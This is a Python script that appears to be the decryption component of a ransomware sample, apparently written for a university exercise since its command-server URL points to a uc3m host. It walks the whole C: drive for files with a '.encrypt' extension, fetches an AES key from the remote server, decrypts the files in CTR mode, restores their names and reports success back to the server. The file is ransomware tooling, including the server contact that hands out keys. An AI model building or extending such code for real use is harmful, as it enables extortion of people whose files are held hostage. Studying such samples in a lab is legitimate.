from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Util import Counter
import os
from communication import receive_key
from communication import successfully_decrypted


url = 'http://serverfag.gast.it.uc3m.es:8080'
extension = ".encrypt"

def get_fileList(path):

	filelist = []
	for root, dirs, files in os.walk(path, topdown=False):
		for name in files:
			if name.endswith(extension):
				filelist.append(os.path.join(root, name))
	return filelist

def decrypt(filename, key):
    ctr = Counter.new(128)
    try:
        file = open(filename, "rb+")
        ciphertext = file.read()
        file.close()

        decrypt_object = AES.new(key, AES.MODE_CTR, counter=ctr)
        plaintext = decrypt_object.decrypt(ciphertext)

        file = open(filename, "wb")
        file.write(plaintext)
        file.close()
        os.rename(filename, filename[:-len(extension)])
    except:
        pass

def decrypt_all_files(path, key):

	fileList = get_fileList(path)
	for filename in fileList:
		decrypt(filename, key)


key = receive_key(url)
key = bytes.fromhex(key)
path = "C:\\"
decrypt_all_files(path, key)
successfully_decrypted(url)
